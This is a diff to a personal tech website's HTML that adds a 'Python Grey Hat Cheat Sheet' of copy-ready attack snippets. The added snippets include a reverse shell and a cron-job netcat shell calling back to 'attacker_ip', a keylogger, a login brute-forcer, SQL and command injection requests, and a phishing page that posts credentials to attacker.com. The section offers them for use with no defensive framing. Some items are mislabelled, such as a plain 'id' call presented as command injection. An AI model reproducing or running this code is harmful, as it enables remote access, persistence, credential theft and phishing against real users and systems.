@@ -12,6 +12,37 @@
   <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <title>madeoftech</title>
+    <style>
+    /* Styling for the code block */
+    .code-block {
+      background-color: #2d3748;
+      color: #e5e7eb;
+      border-radius: 0.5rem;
+      padding: 1rem;
+      font-size: 1rem;
+      overflow-x: auto;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    .copy-btn {
+      background-color: #4A90E2;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 0.375rem;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background-color 0.2s;
+    }
+    .copy-btn:hover {
+      background-color: #357ABD;
+    }
+    .command-container {
+      margin-bottom: 2rem;
+    }
+    .section-title {
+      margin-top: 2rem;
+      text-decoration: underline;
+    }
+  </style>
 </head>
 
 <body class="bg-gray-100 text-gray-800">
@@ -114,6 +145,368 @@
         </section>
 
         <!-- Additional Sections would follow the same structure -->
+        <body class="bg-gray-900 text-gray-100">
+
+  <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">Python Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Basic Python Grey Hat Commands Section -->
+      <h2 class="text-2xl text-indigo-400 mb-4">Basic Python Commands</h2>
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Create a Reverse Shell</h3>
+        <p class="text-gray-200 mb-2">Create a reverse shell in Python that connects back to your IP and port.</p>
+        <div class="code-block">
+          <pre id="reverse_shell">
+import socket
+import subprocess
+import sys
+
+# Connect back to the attacker's machine
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("attacker_ip", 1234))
+sys.stdout = s.makefile("w")
+subprocess.call(["/bin/bash", "-i"], shell=True)
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('reverse_shell')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Port Scanning with Python</h3>
+        <p class="text-gray-200 mb-2">Use Python to scan open ports on a target system.</p>
+        <div class="code-block">
+          <pre id="port_scan">
+import socket
+
+target = "target_ip"
+ports = [21, 22, 80, 443, 8080]
+
+for port in ports:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((target, port))
+    if result == 0:
+        print(f"Port {port} is open")
+    sock.close()
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('port_scan')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Get System Information</h3>
+        <p class="text-gray-200 mb-2">Get information about the system including OS, architecture, etc.</p>
+        <div class="code-block">
+          <pre id="system_info">
+import platform
+import os
+
+print("System Information:")
+print(f"OS: {platform.system()} {platform.release()}")
+print(f"Architecture: {platform.architecture()}")
+print(f"Machine: {platform.machine()}")
+print(f"Node: {platform.node()}")
+print(f"Processor: {platform.processor()}")
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('system_info')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Advanced Python Grey Hat Commands Section -->
+      <h2 class="text-2xl text-indigo-400 mb-4 mt-12">Advanced Python Grey Hat Commands</h2>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Create a Keylogger</h3>
+        <p class="text-gray-200 mb-2">A basic keylogger to capture keystrokes.</p>
+        <div class="code-block">
+          <pre id="keylogger">
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        with open("keylog.txt", "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open("keylog.txt", "a") as f:
+            f.write(f"{str(key)}")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('keylogger')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Brute Force Password Cracking</h3>
+        <p class="text-gray-200 mb-2">A simple brute force password cracker using Python and a wordlist.</p>
+        <div class="code-block">
+          <pre id="brute_force">
+import requests
+
+url = "http://target.com/login"
+wordlist = ["password123", "admin", "123456", "letmein"]
+
+for password in wordlist:
+    response = requests.post(url, data={"username": "admin", "password": password})
+    if "login failed" not in response.text:
+        print(f"Password found: {password}")
+        break
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('brute_force')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection</h3>
+        <p class="text-gray-200 mb-2">Inject commands into a vulnerable system using Python.</p>
+        <div class="code-block">
+          <pre id="command_injection">
+import os
+
+os.system("id")  # Command injection to execute commands on the system
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Packet Sniffing</h3>
+        <p class="text-gray-200 mb-2">Sniff network packets using Python with the `scapy` library.</p>
+        <div class="code-block">
+          <pre id="packet_sniff">
+from scapy.all import sniff
+
+def packet_callback(packet):
+    print(packet.show())
+
+sniff(prn=packet_callback, count=10)  # Sniff 10 packets
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('packet_sniff')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Send a Spoofed Email</h3>
+        <p class="text-gray-200 mb-2">Send a spoofed email using Python and the `smtplib` library.</p>
+        <div class="code-block">
+          <pre id="spoof_email">
+import smtplib
+from email.mime.text import MIMEText
+
+sender = "attacker@example.com"
+receiver = "victim@example.com"
+subject = "Important Message"
+body = "This is a test email."
+
+msg = MIMEText(body)
+msg["Subject"] = subject
+msg["From"] = sender
+msg["To"] = receiver
+
+server = smtplib.SMTP("smtp.example.com", 587)
+server.starttls()
+server.login("your_username", "your_password")
+server.sendmail(sender, receiver, msg.as_string())
+server.quit()
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('spoof_email')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+
+  </div>
+          <!-- blach hat-->
+            <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">Python Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+      
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Advanced Port Scanning with Python</h3>
+        <p class="text-gray-200 mb-2">Scan a range of ports with increased concurrency for faster results.</p>
+        <div class="code-block">
+          <pre id="advanced_port_scan">
+import socket
+from concurrent.futures import ThreadPoolExecutor
+
+target = "target_ip"
+ports = range(1, 1025)  # Scan ports 1 to 1024
+
+def scan_port(port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((target, port))
+        if result == 0:
+            print(f"Port {port} is open")
+    except Exception as e:
+        print(f"Error scanning port {port}: {e}")
+
+with ThreadPoolExecutor(max_workers=100) as executor:
+    executor.map(scan_port, ports)
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('advanced_port_scan')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Advanced Packet Sniffing with Scapy</h3>
+        <p class="text-gray-200 mb-2">Capture packets with custom filtering using Scapy.</p>
+        <div class="code-block">
+          <pre id="advanced_packet_sniff">
+from scapy.all import sniff
+
+def packet_callback(packet):
+    if packet.haslayer("IP"):
+        ip_src = packet["IP"].src
+        ip_dst = packet["IP"].dst
+        print(f"Packet from {ip_src} to {ip_dst}")
+        packet.show()
+
+sniff(filter="ip", prn=packet_callback, store=0, count=50)
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('advanced_packet_sniff')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Information Gathering</h2>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">DNS Zone Transfer</h3>
+        <p class="text-gray-200 mb-2">Perform a DNS zone transfer to gather information about a domain.</p>
+        <div class="code-block">
+          <pre id="dns_zone_transfer">
+import dns.query
+import dns.zone
+
+target_domain = "example.com"
+
+zone = dns.zone.from_xfr(dns.query.xfr(target_domain, "target_dns_server"))
+names = zone.nodes.keys()
+
+for name in names:
+    print(zone[name].to_text(name))
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dns_zone_transfer')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Web Application Attacks</h2>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">SQL Injection with Custom Payloads</h3>
+        <p class="text-gray-200 mb-2">Inject SQL payloads into vulnerable input fields to gain unauthorized access.</p>
+        <div class="code-block">
+          <pre id="sql_injection_payload">
+import requests
+
+url = "http://target.com/login"
+payload = {"username": "' OR 1=1 --", "password": "anything"}
+
+response = requests.post(url, data=payload)
+
+if "Welcome" in response.text:
+    print("SQL injection successful!")
+else:
+    print("Injection failed.")
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('sql_injection_payload')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection in Web Forms</h3>
+        <p class="text-gray-200 mb-2">Perform command injection on a vulnerable web application.</p>
+        <div class="code-block">
+          <pre id="command_injection">
+import requests
+
+url = "http://target.com/execute_command"
+payload = {"command": "id; ls"}
+
+response = requests.post(url, data=payload)
+
+if "uid" in response.text:
+    print("Command injection successful!")
+else:
+    print("Injection failed.")
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Post-Exploitation Techniques</h2>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Privilege Escalation via Sudo</h3>
+        <p class="text-gray-200 mb-2">Escalate privileges on Linux using `sudo` abuse techniques.</p>
+        <div class="code-block">
+          <pre id="sudo_privilege_escalation">
+import os
+
+# Check if we can run commands as root without a password
+os.system("sudo -l")
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('sudo_privilege_escalation')" class="copy-btn">Copy</button>
+      </div>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Persistence via Cron Jobs</h3>
+        <p class="text-gray-200 mb-2">Set up a reverse shell through a cron job to maintain access.</p>
+        <div class="code-block">
+          <pre id="cron_job_persistence">
+import os
+
+# Add a reverse shell to cron jobs (Linux)
+reverse_shell = "*/5 * * * * nc -e /bin/bash attacker_ip 4444"
+
+os.system(f'(crontab -l; echo "{reverse_shell}") | crontab -')
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('cron_job_persistence')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Social Engineering</h2>
+
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Phishing with a Fake Login Page</h3>
+        <p class="text-gray-200 mb-2">Create a fake login page to capture user credentials.</p>
+        <div class="code-block">
+          <pre id="phishing_page">
+# Basic HTML template for a phishing page
+phishing_html = """
+<html>
+  <head><title>Fake Login Page</title></head>
+  <body>
+    <h2>Login</h2>
+    <form action="http://attacker.com/collect_credentials" method="POST">
+      <input type="text" name="username" placeholder="Username"><br>
+      <input type="password" name="password" placeholder="Password"><br>
+      <input type="submit" value="Login">
+    </form>
+  </body>
+</html>
+"""
+
+with open("fake_login_page.html", "w") as f:
+    f.write(phishing_html)
+print("Fake login page created!")
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('phishing_page')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
       </main>
     </div>
   </div>
@@ -125,6 +518,18 @@
   <script>
     // Function to dynamically set the current year in the footer
     document.getElementById("year").textContent = new Date().getFullYear();
+  </script>
+    <script>
+    function copyToClipboard(elementId) {
+      const code = document.getElementById(elementId).innerText;
+      const textArea = document.createElement("textarea");
+      textArea.value = code;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textArea);
+      alert("Code copied to clipboard!");
+    }
   </script>
 </body>
 
